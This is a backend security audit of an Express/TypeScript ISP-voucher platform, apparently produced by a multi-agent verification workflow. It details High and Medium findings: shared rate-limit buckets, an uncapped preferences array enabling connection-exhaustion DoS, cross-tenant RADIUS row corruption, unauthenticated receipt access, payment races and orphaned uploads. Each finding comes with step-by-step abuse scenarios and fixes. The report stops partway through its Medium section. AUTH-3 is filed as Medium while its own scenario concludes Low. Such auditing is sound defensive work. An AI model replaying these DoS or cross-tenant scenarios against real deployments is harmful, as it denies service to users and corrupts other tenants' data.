# Wasel Backend — Security & Correctness Audit

**Date:** 2026-07-19  ·  **Target:** `backend/` (Node.js / Express / TypeScript)  ·  **Type:** read-only audit (no code changed)

This audit scanned the entire backend — routes, controllers, services (~11.2k LOC), middleware, utils, validators, cron/interval jobs, migrations, config, and the FreeRADIUS / WireGuard / RouterOS integration seams — for bugs, security holes, and code errors. It is the backend counterpart to the mobile audit (`docs/MOBILE_AUDIT_2026-07-18.md`).

## Executive summary

**41 findings confirmed** after adversarial verification: **2 High, 13 Medium, 26 Low.** A further 4 candidate findings were investigated and **cleared** (see the end of this report).

The backend is, on the whole, a mature and well-hardened codebase: SQL is parameterized throughout, secrets are AES-256-GCM encrypted at rest with per-call IVs and verified auth tags, JWT refresh rotation is race-safe via an atomic Redis DEL, password/OTP brute-force caps are correct, and `child_process` calls use argument arrays (no shell). Most findings are hardening and correctness issues rather than open doors. The two High findings are both **availability (DoS)** issues, not data-exposure ones.

### The two High findings

- **GAP-1 — Missing Express `trust proxy` collapses all pre-auth rate limiting into one shared bucket (global DoS)** (`backend/src/app.ts:13`)
- **GAP-7 — Uncapped notification preferences array enables authenticated connection-exhaustion DoS** (`backend/src/validators/notification.validators.ts:23`)

### Themes across the Medium findings

- **RouterOS key-casing bugs (CODE-1, CODE-2):** several code paths read kebab-case keys (`cpu-load`, `use-radius`, `dst-port`) that the `routeros-client` library strips and camelCases — so system-info/session stats read as undefined and healthy routers are permanently reported *degraded* and needlessly re-remediated every health check. This is the same class of bug recorded in memory (`routeros-client key transform`).
- **Report/quota correctness (CODE-3, SQL-2):** the voucher-sales report filters on a `voucher_meta.status` of `used` that is never persisted, and voucher deletion decrements `vouchers_used` by a pre-selected count rather than the actual deleted `rowCount`, letting concurrent deletes farm quota back.
- **Payment/state races (PAY-1):** `uploadReceipt`/`cancelPayment` update the `payments` row with no status guard, so a race can move an already-approved payment back to pending or cancel it.
- **Deploy-time DB risk (SQL-1):** the migration runner inherits the app pool's 30s `statement_timeout`; a non-`CONCURRENTLY` `CREATE INDEX` on the production `radacct` table can time out mid-deploy and crash-loop the backend. (This overlaps the migration-036 deploy caution already noted for the mobile audit.)
- **Multi-tenancy (IDOR-1, IDOR-2):** cross-tenant RADIUS group-name collisions can corrupt another operator's stored profile rows (though not live customer enforcement), and bank receipts are served from an unauthenticated static mount.

---

## Method

Findings were produced by a multi-agent workflow, not a single pass:

1. **9 parallel finder lenses** over `backend/src` (auth, authorization/IDOR, crypto/secrets, SQL/migrations, input/API, RADIUS/WireGuard/RouterOS, payments/uploads, async/jobs/resources, type-safety/correctness) → 44 raw findings.
2. **Dedup** → 39 distinct findings.
3. **Adversarial verification** — each finding was independently checked by **3 verifiers** with distinct lenses (does the defect really exist as written / is the impact reachable given the auth+ownership gates / can a concrete repro be constructed). Verifiers were instructed to *refute* and to default to "refuted" when unconvinced. A finding survived only with **≥2 of 3** confirmations; severity is the median of the confirming verifiers, so several finder-assigned severities were revised **down** (e.g. IDOR-1 High→Medium, AUTH-1/AUTH-2 Medium→Low).
4. **Completeness critic + targeted gap round** — a critic looked for missed subsystems/attack classes; its gaps (the `GAP-*` findings) were themselves verified the same way.

Every finding below cites a real `file:line` and a concrete failure/exploit scenario. The two High findings and the cleared rate-limiter item were additionally re-read by hand against the source.

> **Note on completeness:** 10 of ~140 verifier calls hit the structured-output retry cap and returned no verdict. None of the 4 cleared findings was dropped for that reason (each retained at least one real verdict), so no finding was silently lost — but a handful of surviving findings were judged on 2 verdicts instead of 3.

---

## Findings

## High (2)

### GAP-1 — Missing Express `trust proxy` collapses all pre-auth rate limiting into one shared bucket (global DoS)

- **Severity:** High  ·  **Verifier votes:** 3/3  ·  **Category:** denial-of-service
- **Location:** `backend/src/app.ts:13`

**What it is.** The Express app is created (app.ts:13) and wires helmet/cors/rate-limiting, but never calls `app.set('trust proxy', ...)`, and neither does server.ts. In production the app sits behind Nginx (docs/deploy.md:294-297 proxies to 127.0.0.1:3000 and sets X-Forwarded-For / X-Real-IP). Without `trust proxy`, Express ignores X-Forwarded-For and resolves `req.ip` from the socket, which is Nginx's constant upstream address. Both `generalLimiter` (max 100/min, app.ts:49) and `authLimiter` (max 10/min, applied to every auth route in auth.routes.ts:25-67) use express-rate-limit's DEFAULT keyGenerator, which keys on `req.ip`. Because `req.ip` is identical for every request coming through Nginx, all unauthenticated clients share a single rate-limit bucket.

**Impact.** Any single unauthenticated attacker can exhaust the shared bucket and lock out every user platform-wide. Ten requests/minute to auth endpoints (login, register, forgot-password, verify-email, resend-otp) trips the max-10 authLimiter for the ONE shared key, so all legitimate users are globally denied login/registration/password-reset (RATE_LIMIT DoS). Conversely, per-attacker brute-force throttling is diluted across all clients, weakening the intended per-IP protection. This is reachable pre-auth by any client.

**Concrete scenario.** An unauthenticated attacker sends 10 POST /api/v1/auth/login (or forgot-password) requests within one minute from any single host. Because req.ip resolves to Nginx's fixed 127.0.0.1 for every request, all traffic shares one authLimiter key; the max-10 bucket is exhausted and every legitimate user across the platform receives 429 AUTH_RATE_LIMIT_EXCEEDED on login/register/refresh/password-reset until the window rolls over. Sustained requests hold the global lockout open indefinitely. Separately, the 100/min generalLimiter is a single platform-wide bucket for all /api/ traffic, so normal multi-user load alone can self-DoS. Per-IP brute-force throttling is simultaneously diluted since all clients count against the same key.

**Suggested fix.** Add `app.set('trust proxy', 1)` (or 'loopback' — the exact number of proxy hops in front, here a single Nginx) in app.ts immediately after `const app = express()`. This makes `req.ip` resolve to the real client via the rightmost-trusted X-Forwarded-For hop, restoring per-client rate-limit keys. Verify Nginx overwrites (not appends untrusted) XFF, and confirm the hop count matches the deployment so clients cannot spoof `req.ip` by sending their own X-Forwarded-For.

---

### GAP-7 — Uncapped notification preferences array enables authenticated connection-exhaustion DoS

- **Severity:** High  ·  **Verifier votes:** 3/3  ·  **Category:** dos
- **Location:** `backend/src/validators/notification.validators.ts:23`

**What it is.** updatePreferencesSchema (backend/src/validators/notification.validators.ts:23-32) enforces `.min(1)` on the `preferences` array but has NO `.max()` bound, and does not deduplicate by category. Any authenticated user can PUT /notifications/preferences (backend/src/routes/notification.routes.ts:18 — gated only by `authenticate`) with an array of tens of thousands of entries (all validly typed, duplicate categories allowed). notificationPrefs.service.updatePreferences (backend/src/services/notificationPrefs.service.ts:23-43) then checks out ONE pooled pg client, issues `BEGIN`, and loops `for (const pref of prefs)` performing one serialized `INSERT ... ON CONFLICT` round-trip per element, committing only after the whole storm.

**Impact.** A single authenticated request holds one pool connection open through hundreds of thousands of serialized DB round-trips inside one uncommitted transaction. With express.json limit at 10mb (app.ts:34) and each element ~45 bytes, one request carries ~200k inserts. A few concurrent such requests exhaust the pg connection pool, starving all other users' queries — an authenticated latency-amplification / connection-exhaustion DoS on a live production platform.

**Concrete scenario.** An attacker with any valid account (registration open) sends PUT /api/v1/notifications/preferences with a ~10MB JSON body containing ~200,000 entries like {"category":"router_online","enabled":true} (duplicates allowed). Validation passes (min(1) only, no max). The service checks out one pg pool connection, opens a transaction, and performs 200k serialized INSERT...ON CONFLICT round-trips before committing, holding that connection for tens of seconds to minutes (statement_timeout is per-statement and never trips). Firing DB_POOL_MAX such requests concurrently occupies every pool connection; all other users' queries then fail after connectionTimeoutMillis (5s), denying service platform-wide.

**Suggested fix.** Add a small `.max()` to the array matching the 8-value category enum (e.g. `.max(8)`), since there are only 8 valid categories and any legitimate update sends at most one entry per category. Optionally dedupe by category server-side and/or collapse the loop into a single multi-row INSERT ... ON CONFLICT to avoid the per-element round-trip. A `.max(8)` alone fully closes the DoS.

---

## Medium (13)

### ASYNC-1 — 30-second cron jobs can overlap their previous run; CoA-disconnect job piles up radclient processes and duplicate CoA during outages

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** async
- **Location:** `backend/src/jobs/validityCoaDisconnect.ts:22`

**What it is.** All jobs use cron.schedule(pattern, async fn) with no options. The installed node-cron 4.2.1 allows overlapping executions by default (node-cron runner.js:35 sets noOverlap = false unless opted in; runner.js:111-120 starts a new execution even when the last is 'pending'). The validity CoA job runs every 30s and sequentially awaits sendDisconnectRequest per expired-but-active session (lines 55-62). Each disconnect to an unreachable NAS takes ~4s (radclient.service.ts:136 default timeoutMs 3000 + killTimer at timeoutMs+1000). With ~8+ expired sessions on unreachable routers (exactly the state during the recurring fleet-wide WireGuard outages this platform has experienced), one tick exceeds 30s and ticks begin to stack. There is also no per-row backoff/marking: every tick re-selects the same open radacct rows and re-fires CoA until the stale-session reaper closes them (~15 min). The same missing-noOverlap pattern applies to usageLimitEnforcement.ts:16 and validityExpiration.ts:15.

**Impact.** During a fleet outage with N expired active sessions, tick duration is ~4N seconds while a new tick still starts every 30s, so ~4N/30 job executions run concurrently for up to the 15-minute reaper window — each spawning radclient child processes and issuing duplicate Disconnect-Requests and duplicate DB queries. Concretely: 100 expired sessions ⇒ ~400s ticks, ~13 concurrent executions, hundreds of radclient spawns per minute on a prod VPS that is already degraded.

**Concrete scenario.** Fleet-wide WireGuard outage: 100 vouchers expire mid-session, each with an open radacct row on an unreachable router. Each tick's SELECT returns all 100; sequential CoA sends each block ~3-4s awaiting radclient timeout, so a tick lasts ~300-400s. Because noOverlap is false, a new tick still fires every 30s, so ~10-13 job executions run concurrently, each spawning 100 radclient child processes and issuing duplicate Disconnect-Requests — hundreds of radclient spawns per minute plus repeated DB queries on an already-degraded prod VPS, sustained until the stale-session reaper closes the rows ~15 minutes later.

**Suggested fix.** Pass { noOverlap: true } to cron.schedule for the 30s and 2-minute jobs (or keep a module-level running-boolean guard), and/or bound each tick: add LIMIT to the SELECT, run disconnects with a small concurrency cap, and record a last-attempt timestamp (e.g. in voucher_meta or Redis) so a session on an unreachable NAS is retried with backoff instead of every 30s.

---

### AUTH-3 — Inconsistent email case normalization: register/login/forgot use exact match while change-email lowercases

- **Severity:** Medium  ·  **Verifier votes:** 2/3  ·  **Category:** auth
- **Location:** `backend/src/validators/auth.validators.ts:14`

**What it is.** Only changeEmailSchema normalizes case (.transform((e) => e.trim().toLowerCase()), line 92). registerSchema (line 14), loginSchema (line 24), forgotPasswordSchema (line 47), resetPasswordSchema, verifyEmailSchema, and resendVerificationSchema pass email through verbatim, and auth.service.ts compares with exact match everywhere: register duplicate check `SELECT id FROM users WHERE email = $1` (line 51), login `FROM users WHERE email = $1` (line 80), forgotPassword/resetPassword likewise — while changeEmail/verifyEmailChange use `LOWER(email) = $1` (lines 348, 370). The two conventions contradict each other in the same codebase.

**Impact.** (1) A user whose mobile keyboard auto-capitalizes registers as 'John@x.com'; later typing 'john@x.com' yields 401 INVALID_CREDENTIALS at login and a silent no-op from forgot-password (anti-enumeration masks it) — an unrecoverable-looking lockout. (2) 'john@x.com' and 'John@x.com' can register as two separate accounts, yet the change-email path 409s on any case-variant. (3) OTP reset Redis keys (otp:reset:${email}) are keyed by raw casing while the attempts counter uses email.toLowerCase() (token.service.ts:170,176-179), so the lockout counter and the OTP key can track different identities.

**Concrete scenario.** A user registers via the mobile app with an auto-capitalized email 'John@x.com' (stored raw at auth.service.ts:58). Later they type 'john@x.com' at login; auth.service.ts:80 does WHERE email=$1 exact match, finds no row, and returns 401 INVALID_CREDENTIALS despite a correct password. Forgot-password (line 222) also silently no-ops behind the anti-enumeration guard. Separately, because migrations/003 makes email case-sensitively UNIQUE, 'john@x.com' can then register as a second, distinct account. Consequence is confined to that same user (login friction / account duplication) and is recoverable by using the original casing or via support — no attacker obtains access to another user's account, no secret is disclosed, and no data is corrupted, hence Low severity.

**Suggested fix.** Add the same .trim().toLowerCase() transform to every email field in auth.validators.ts, switch the register duplicate check to LOWER(email), and run a one-off migration to lowercase existing users.email (resolving any case-duplicate pairs manually) plus a unique index on LOWER(email).

---

### CODE-1 — RouterOS system info and live-session stats read kebab-case keys the client library never returns

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/src/services/routerOs.service.ts:226`

**What it is.** routeros-client transforms every RouterOS response key from dashed-case to camelCase before returning it (verified in node_modules/routeros-client/dist/RosApiCrud.js treatMikrotikProperties, plus leading-dot strip and string→number/boolean casts). getSystemInfo (lines 226-233) reads resource['cpu-load'], resource['free-memory'], resource['total-memory'], resource['board-name'], resource['architecture-name'], routerboard?.['serial-number'], and getActiveHotspotUsers (lines 270-275) reads entry['mac-address'], entry['bytes-in'], entry['bytes-out'], entry['idle-time'], entry['login-by']. All of these keys are undefined at runtime — the real keys are cpuLoad, freeMemory, macAddress, bytesIn, etc. The same file already handles the transform correctly elsewhere (entry.id ?? entry['.id'], entry.user). Tests mock the api object so they never catch it (matches the project memory note about this exact gotcha). The dead exports listInterfaces/listHotspotProfiles/listAddresses (lines 409-569, no callers) carry the same bug in e['use-radius'] at line 447.

**Impact.** Every RouterOS-backed metrics surface silently returns zeros/empties instead of failing: GET /routers/:id/status shows cpuLoad 0, freeMemory 0, totalMemory 0, boardName/architecture 'Unknown', serialNumber null; the live-sessions endpoint shows every connected client with empty MAC address, bytesIn 0, bytesOut 0, idleTime '0s', loginBy ''. Operators cannot see per-session data usage or identify devices — wrong data presented as healthy, in prod with paying users.

**Concrete scenario.** An operator opens a router's status page (GET router status → router.service.ts:495 → getSystemInfo). The router returns real data like cpuLoad=12, freeMemory=48000000, boardName='RB750Gr3', serialNumber='ABC123'. Because the service reads resource['cpu-load'] etc. (undefined after the library camelCases the keys), the UI shows CPU 0%, free/total memory 0, board 'Unknown', architecture 'Unknown', serial null — a healthy router mispresented as flatlined. Simultaneously, the live-sessions endpoint (session.service.ts:103 → getActiveHotspotUsers) lists every connected client with macAddress='', bytesIn=0, bytesOut=0, idleTime='0s', loginBy='', so operators can neither see per-session data usage nor identify devices, on prod with paying users.

**Suggested fix.** Read the camelCase keys the library actually emits (resource.cpuLoad, resource.freeMemory, resource.totalMemory, resource.boardName, resource.architectureName, routerboard?.serialNumber, entry.macAddress, entry.bytesIn, entry.bytesOut, entry.idleTime, entry.loginBy, session.macAddress at line 330). Values may already be numbers/booleans after the library's cast, so wrap with Number(...) instead of parseInt(x || '0'). Delete the unused listInterfaces/listHotspotProfiles/listAddresses exports or fix line 447-448 (e.useRadius) if kept.

---

### CODE-2 — Health probes read `use-radius` and `dst-port` kebab keys — healthy routers permanently report degraded and get re-remediated every check

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/src/services/routerHealth.service.ts:265`

**What it is.** Same routeros-client camelCase transform as CODE-1. probeHotspotUsesRadius (line 265) evaluates String(p['use-radius'] ?? '').toLowerCase() — always '' because the returned key is useRadius — so every target profile is counted as failing, the probe returns status 'fail' on every run, and ensureHotspotRadiusSettings remediation is invoked on every single health check (line 278), writing profile settings to the device each time without ever clearing the failure. probeFirewallAllowsRadius (line 383) calls firewallPortMatches(r['dst-port'], port) — always undefined (real key dstPort) — so the probe always reports UDP accept rules for 1812, 3799, 51820 as missing even when they exist.

**Impact.** Every router with a correctly configured hotspot shows two failed probes on GET /routers/:id/health, computeOverall returns 'degraded' instead of 'healthy' for the entire fleet, and operators are told to re-run setup steps 6 and 7 that are already applied. The false hotspotUsesRadius failure also triggers a device write (profile update) on every health check — repeated unnecessary configuration churn on production routers. Health reporting cannot distinguish a genuinely misconfigured router from a healthy one for these two checks.

**Concrete scenario.** An operator with a fully correctly configured router (hotspot profile use-radius=yes, firewall UDP accept rules for 1812/3799/51820 present) opens GET /routers/:id/health. The library returns rows keyed useRadius:'yes' and dstPort:'1812', but the probes read p['use-radius'] and r['dst-port'], both undefined. probeHotspotUsesRadius counts the profile as failing → status 'fail' and calls ensureHotspotRadiusSettings, pushing a profile-set write to the live router; probeFirewallAllowsRadius reports all three ports missing → status 'fail'. computeOverall returns 'degraded'. Every subsequent health check repeats the device write. The operator is told to re-run setup steps 6 and 7 that are already applied, and health can never distinguish a genuinely broken router from a healthy one for these two checks.

**Suggested fix.** Read p.useRadius (value may be boolean true or string 'yes' after the library cast — handle both) and r.dstPort. Add one integration-style test that feeds a realistically-transformed row (camelCase keys, boolean/number casts) through these probes so mocks stop hiding the transform.

---

### CODE-3 — Voucher-sales report filters on stored voucher_meta.status but 'used' is never persisted — report columns systematically wrong

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/src/services/report.service.ts:158`

**What it is.** getVoucherSalesReport counts COUNT(*) FILTER (WHERE vm.status = 'used'), = 'expired', and = 'active' (as 'remaining') against the stored voucher_meta.status column. But in the current model status is DERIVED at read time: grep confirms nothing in the codebase ever writes status = 'used' (voucher.service.ts:302 computes it in assembleVoucherInfo only; buildVoucherStatusConditions exists precisely because the stored column is stale). Stored values are only 'unused' (insert), 'active'/'disabled' (operator toggle), and 'expired' (usage-limit cron). Validity-based expiry (radcheck Expiration) never updates the stored column either.

**Impact.** The tier-locked Pro/Enterprise voucher-sales report (GET /reports?type=voucher-sales and its CSV export) returns used = 0 on every row regardless of real usage, 'remaining' counts only vouchers an operator manually re-activated (fresh vouchers are 'unused' and excluded), and 'expired' misses all validity-window expiries. The paid reporting feature presents materially wrong business numbers while the voucher list screen (which uses derived status) shows different, correct values for the same vouchers.

**Concrete scenario.** A Pro-tier operator creates 100 vouchers; over the week 40 are consumed (sessions in radacct, no open session), 10 have open sessions, 5 pass their validity window (radcheck Expiration in the past), and 45 are untouched. On the voucher list screen the derived status correctly shows 40 used, 10 active, 5 expired, 45 unused. The operator then opens GET /reports?type=voucher-sales (or its CSV export) for the same range: it reports used=0 (no row ever stores 'used'), remaining=0 (no voucher was manually re-activated, all live ones are stored 'unused'/derived), and expired=0 (validity-window expiries never touched the stored column; only usage-limit-cron expiries would show). The paid report thus presents systematically wrong business numbers that contradict the operator's own voucher list.

**Suggested fix.** Reuse the shared derived-status SQL fragments (buildVoucherStatusConditions from voucher.service.ts) or the radacct/radcheck EXISTS predicates directly in the report aggregation so the report and the voucher list share one status definition, as admin.service.getAllVouchers already does.

---

### CODE-4 — errorHandler collapses body-parser and multer errors into 500 INTERNAL_ERROR

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/src/middleware/errorHandler.ts:28`

**What it is.** errorHandler only special-cases err instanceof AppError; every other error becomes a 500 with code INTERNAL_ERROR and is captured to Sentry (lines 44-59). But two very common client-input failures arrive here as non-AppError errors carrying their own intended status: (1) express.json() SyntaxError/entity-too-large errors (statusCode 400/413 set by body-parser, app.ts:34) and (2) multer's MulterError for LIMIT_FILE_SIZE on receipts >5MB (middleware/upload.ts:42). A repo-wide grep confirms there is no MulterError or body-parser (entity.too.large/SyntaxError) mapping anywhere in src/.

**Impact.** A phone camera photo over 5MB uploaded to POST /subscription/receipt — a routine occurrence for a receipt-upload flow with paying users — returns 500 'Internal server error' instead of 413/400 with a stable code, so the mobile app cannot show 'file too large'. Malformed JSON from any (even unauthenticated) client also returns 500 instead of 400. Every such request additionally fires logger.error + Sentry.captureException, letting an unauthenticated client flood the error tracker with garbage-JSON POSTs and burying real incidents.

**Concrete scenario.** 1) A logged-in paying user uploads a phone photo >5MB to POST /api/v1/subscription/receipt. Multer throws MulterError LIMIT_FILE_SIZE (not an AppError) → errorHandler returns 500 {code:'INTERNAL_ERROR','Internal server error'} instead of 413 with a stable code, so the mobile app cannot show 'file too large'; each attempt also fires logger.error + Sentry.captureException. 2) Any client (unauthenticated — express.json runs before authenticate) POSTs malformed JSON, e.g. `curl -X POST https://api.wa-sel.com/api/v1/auth/login -H 'Content-Type: application/json' -d '{bad'` → body-parser SyntaxError (entity.parse.failed) → 500 instead of 400, and each such request captures to Sentry, allowing cheap flooding of the error tracker that buries genuine 5xx incidents.

**Suggested fix.** Before the generic 500 branch, map known client errors: `if (err instanceof multer.MulterError) return res.status(err.code === 'LIMIT_FILE_SIZE' ? 413 : 400).json({ success:false, error:{ message, code:'UPLOAD_ERROR' } })` and `if ('type' in err && (err as any).type === 'entity.parse.failed') → 400 VALIDATION_ERROR` / `'entity.too.large' → 413`. Only capture to Sentry for genuinely unexpected errors.

---

### IDOR-1 — Cross-tenant RADIUS profile corruption via unscoped shared groupname namespace

- **Severity:** Medium (finder proposed High; verifiers recalibrated)  ·  **Verifier votes:** 2/3  ·  **Category:** idor
- **Location:** `backend/src/services/profile.service.ts:312`

**What it is.** RADIUS group profiles are tenant-scoped only in the radius_profiles table (UNIQUE(user_id, group_name), migration 003_application_tables.sql:95), but the actual RADIUS enforcement rows in radgroupcheck, radgroupreply, and radusergroup are keyed on the GLOBAL groupname column with NO user_id scoping. createProfile (lines 115-121) only checks name uniqueness per-user, so two operators can both own a profile named e.g. 'premium'; updateProfile then runs DELETE FROM radgroupcheck/radgroupreply WHERE groupname=$1 (lines 312-313) followed by re-insert of only the caller's attributes; deleteProfile deletes the same rows by groupname (lines 400-401) and counts assigned vouchers globally via radusergroup (lines 381-384). None of these constrain by the owning user.

**Impact.** Operator B creating/editing/deleting a profile whose group_name collides with Operator A's (generic names like 'premium', 'default', '1hour', 'vip' are highly likely to collide) silently wipes or rewrites the RADIUS enforcement attributes (Mikrotik-Rate-Limit, Session-Timeout, Max-All-Session, Max-Total-Octets) applied to A's vouchers and connected customers — e.g. removing A's data cap or throttling A's users to B's limits. B deleting 'premium' deletes A's enforcement rows outright; conversely A's radusergroup assignments make B's PROFILE_IN_USE check fire, blocking B from deleting their own profile and leaking cross-tenant existence. Normal-operator-reachable cross-tenant corruption of live network-auth configuration requiring only a name collision.

**Concrete scenario.** Operator A creates a profile named "premium" (bandwidth 10M/10M, 50GB cap). Operator B, an unrelated authenticated tenant with an active subscription, creates or edits their own profile also named "premium" with 1M/1M and 1GB. B's updateProfile runs DELETE FROM radgroupcheck/radgroupreply WHERE groupname='premium' then re-inserts B's values (profile.service.ts:312-342), or B deletes it, removing the rows entirely (400-401). A's profile page (getRadiusAttributes, 74-94) now shows B's limits or empty attributes, and A's stored group definition rows are silently overwritten/deleted by another tenant — a cross-tenant data-integrity/isolation violation. It does NOT, however, change what any live customer receives at authentication: enforcement is per-username in radcheck/radreply and no radusergroup membership rows exist, so no connected customer of A is throttled or uncapped by B's action. A can restore the rows by re-saving the profile.

**Suggested fix.** Namespace the physical RADIUS group name per tenant — e.g. derive it as `<user_id>:<group_name>` (or a stored opaque per-profile group key) and use that value in every radgroupcheck/radgroupreply/radusergroup read, write, and delete, while showing the human-friendly group_name in the UI. Alternatively enforce a global-unique group namespace via a UNIQUE index on radius_profiles.group_name, but per-tenant prefixing is the multi-tenant-correct fix. Audit voucher.service radusergroup usage for the same key.

---

### IDOR-2 — Bank receipts (financial PII) served with no authentication from the /uploads static mount

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** idor
- **Location:** `backend/src/app.ts:56`

**What it is.** app.ts mounts express.static on '/uploads' with no authenticate/ownership middleware. Bank-transfer receipt images are written to /app/uploads/receipts and their public URL is '/uploads/receipts/<userId>-<timestamp>.<ext>' (upload.ts:32-37, subscription.controller.ts:67). Anyone who obtains a receipt URL can fetch the file with no session, JWT, or ownership check. The only access control is the UUIDv4 userId embedded in the filename acting as a capability token — userIds are identifiers (present in JWT sub, logs, admin panel), not secrets, and the timestamp component is low entropy. URLs persist in the DB (payments.receipt_url), reverse-proxy/access logs, and admin browser history.

**Impact.** A leaked or logged receipt URL (proxy logs, referrer, shared screenshot, DB dump) lets any unauthenticated actor retrieve another operator's bank receipt — account holder name, bank account number, transfer amount — with a plain GET. There is no auth layer to revoke or scope access. In-repo reverse proxy config does not restrict /uploads, and the Express app itself applies none.

**Concrete scenario.** Operator A uploads a bank receipt; the app stores receipt_url=/uploads/receipts/<A-uuid>-1720000000000.jpg in payments and returns it in API responses. That URL later appears in the reverse-proxy access log / a browser referrer / a support screenshot / a DB export. An unauthenticated actor issues GET https://api.wa-sel.com/uploads/receipts/<A-uuid>-1720000000000.jpg and receives the image with the account holder's name, bank account number, and transfer amount — no session, JWT, or ownership check is applied, and there is no mechanism to revoke or scope the link.

**Suggested fix.** Serve receipts through an authenticated route instead of a bare static mount: require authenticate, then authorize (owner userId === req.user.id OR requireAdmin), look up the payment row to confirm ownership, and stream the file from a non-web-root directory. Keep files out of any path served by express.static. If a proxy must serve them, gate with X-Accel-Redirect / internal location behind the same auth check.

---

### INPUT-3 — Profile bandwidth format check skipped unless BOTH fields present, unanchored regex, absent on update

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/validators/profile.validators.ts:43`

**What it is.** createProfileSchema's refine only tests the Mikrotik-Rate-Limit regex when data.bandwidthUp && data.bandwidthDown are BOTH set — supplying just one bypasses the format check entirely, and buildRateLimit (profile.service.ts:66-69) then emits `${up || '0'}/${down || '0'}` into the radgroupreply Mikrotik-Rate-Limit value sent to routers. The regex itself (/^\d+[KkMmGg]?\/\d+[KkMmGg]?/, line 5) has no $ anchor, so '2M/5Mgarbage here' passes even when both are given. updateProfileSchema (lines 54-89) has no bandwidth format refine at all — any ≤20-char string is accepted on PUT /profiles/:pid.

**Impact.** An operator (or a buggy client) can persist e.g. bandwidthUp='not-a-rate' → radgroupreply value 'not-a-rate/0'. RouterOS silently ignores a malformed Mikrotik-Rate-Limit, so every voucher on that profile runs with NO bandwidth cap — the profile UI shows a limit that is not enforced, i.e. incorrect results on the core product promise (selling rate-limited vouchers). No injection (value is a single parameterized column), but the enforcement gap is real and invisible.

**Concrete scenario.** An authenticated operator POSTs a profile with bandwidthUp='not-a-rate' and no bandwidthDown (or PUTs bandwidthUp='junk' via updateProfileSchema, which has no format check). Validation passes; buildRateLimit produces 'not-a-rate/0' and inserts radgroupreply Mikrotik-Rate-Limit := 'not-a-rate/0'. The router receives a malformed rate-limit attribute; vouchers on that profile are not rate-limited as the UI claims, silently breaking the sold bandwidth cap. Even the both-present path passes garbage like '2M/5Mgarbage' because the regex lacks a $ anchor.

**Suggested fix.** Validate each field independently with an anchored per-side pattern, e.g. `const rate = z.string().regex(/^\d+[KkMmGg]?$/);` applied to bandwidthUp/bandwidthDown in BOTH create and update schemas, and drop the both-present refine.

---

### PAY-1 — uploadReceipt/cancelPayment UPDATE payments without status guard — race can un-approve or cancel an already-approved payment

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** payments
- **Location:** `backend/src/services/subscription.service.ts:335`

**What it is.** Both uploadReceipt and cancelPayment do a check-then-write with no status predicate on the final UPDATE. uploadReceipt SELECTs the payment (line 314), verifies status is 'pending'/'rejected', then runs `UPDATE payments SET receipt_url=$1, status='pending', rejection_reason=NULL, reviewed_by=NULL, reviewed_at=NULL WHERE id=$2` (lines 335-344) with no `AND status IN ('pending','rejected')`. cancelPayment does the same pattern: `UPDATE payments SET status='cancelled' WHERE id=$1` (lines 386-389). If an admin approves the payment (reviewPayment correctly guards status='pending' and activates the subscription) between the user's SELECT and UPDATE, the user's write overwrites the approved row.

**Impact.** User uploads a receipt at the same moment the admin clicks approve: the admin's reviewPayment commits status='approved' and activates the subscription; the user's unconditional UPDATE then resets the payment to 'pending' and NULLs reviewed_by/reviewed_at — the approved payment re-enters the admin queue and can be reviewed twice, and the audit trail of who approved it is destroyed. The cancelPayment variant flips an approved payment to 'cancelled' while the activated subscription survives, so admin revenue totals (getStats: SUM(amount) WHERE status='approved') silently lose real revenue and the books no longer match active subscriptions.

**Concrete scenario.** A user has a pending payment with a receipt already uploaded. The admin opens reviewPayment and, in the same instant, the user re-uploads a receipt (or cancels). uploadReceipt reads status='pending' at line 315, then before its line 335 UPDATE runs, the admin's reviewPayment commits: status='approved', reviewed_by=adminId, and the matching subscription is activated (end_date=NOW()+months*30d). The user's unconditional UPDATE then sets status back to 'pending' and NULLs reviewed_by/reviewed_at — the already-approved payment re-enters the admin queue and can be approved a second time (re-extending the subscription), and the record of who approved it is destroyed. In the cancelPayment variant, the user's UPDATE flips the approved payment to 'cancelled' while the activated subscription survives (its own UPDATE only touches pending/pending_change subs), so getStats SUM(amount) WHERE status='approved' silently under-reports real revenue against a live active subscription.

**Suggested fix.** Add the status predicate to the UPDATE itself and check rowCount: `UPDATE payments SET ... WHERE id = $2 AND status IN ('pending','rejected')`; throw 409 PAYMENT_NOT_RESUBMITTABLE / PAYMENT_NOT_CANCELLABLE when rowCount = 0. Same for cancelPayment's payment UPDATE inside its transaction.

---

### PAY-3 — Receipt file is written to public /uploads before validation and orphaned on failure — authenticated disk-exhaustion DoS

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** payments
- **Location:** `backend/src/routes/subscription.routes.ts:42`

**What it is.** On POST /subscription/receipt the middleware order is multer.single('receipt') (writes the file to /app/uploads/receipts, publicly served by express.static) -> verifyUploadMagicBytes -> validate(body) -> controller. verifyUploadMagicBytes only unlinks the file when the magic bytes do NOT match an allowed image (upload.ts:79, 100). For a genuine image the file stays on disk; if body validation then fails (missing/malformed paymentId → 400) or subscriptionService.uploadReceipt throws (PAYMENT_NOT_FOUND, PAYMENT_FORBIDDEN for someone else's payment, PAYMENT_NOT_RESUBMITTABLE), no code path removes the already-persisted file — the controller catch (subscription.controller.ts:73-83) only logs and calls next(error), and the DB never references the file, so it becomes a permanent orphan.

**Impact.** Any authenticated user can repeatedly POST a valid (up to 5MB) image with a random well-formed UUID paymentId; each request passes multer + magic-byte verification, the service throws, and a 5MB orphan lands in the uploads volume — never garbage-collected, and each orphan is attacker-chosen image content hosted unauthenticated at a semi-predictable URL (userId-timestamp.ext). Bounded only by the general rate limiter (which fails open on Redis error), this is a slow disk-fill DoS on the prod VPS that can break future receipt uploads and degrade the service if the volume is shared.

